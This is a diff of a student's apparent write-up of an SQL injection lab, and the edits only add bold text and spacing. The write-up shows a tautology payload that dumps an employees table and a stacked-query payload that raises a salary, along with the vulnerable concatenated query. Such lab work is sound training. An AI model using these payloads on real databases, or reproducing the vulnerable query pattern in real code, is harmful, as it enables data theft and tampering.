@@ -176,7 +176,7 @@ TAN: 3SL99A' OR 'i'='i
 The full query is:  
 "SELECT * FROM employees WHERE last_name = 'Smith' OR 'i'='i' AND auth_tan = '3SL99A' OR 'i'='i';  
   
-This one was a success as both test are always true but I did leave some traces of my actions as I used my actual name and TAN number with the injections. I could have input any random strings to be safe. Too late now.  
+This one was a **success** as both test are always true but I did leave some traces of my actions as I used my actual name and TAN number with the injections. I could have input any random strings to be safe. Too late now.  
   
 The column headers for later use:  
 USERID	FIRST_NAME	LAST_NAME	DEPARTMENT	SALARY	AUTH_TAN  
@@ -186,13 +186,15 @@ USERID	FIRST_NAME	LAST_NAME	DEPARTMENT	SALARY	AUTH_TAN
 This one was a pretty straight forward one after realizing the the syntax in the previous.  
 So the original query again:  
 "SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';  
-Input:  
+  
+Input  
 Name: Fairy  
 TAN: Godmother'; UPDATE employees SET salary=99000 WHERE auth_tan='3SL99A  
+  
 The query being sent to the server would look like this:  
 SELECT * FROM employees WHERE last_name = 'Fairy' AND auth_tan = 'Godmother'; UPDATE employees SET salary=99000 WHERE auth_tan='3SL99A'  
   
-A big payraise for John Smith succesful.  
+A big payraise for John Smith **succesful**.  
 
 ### 13
   
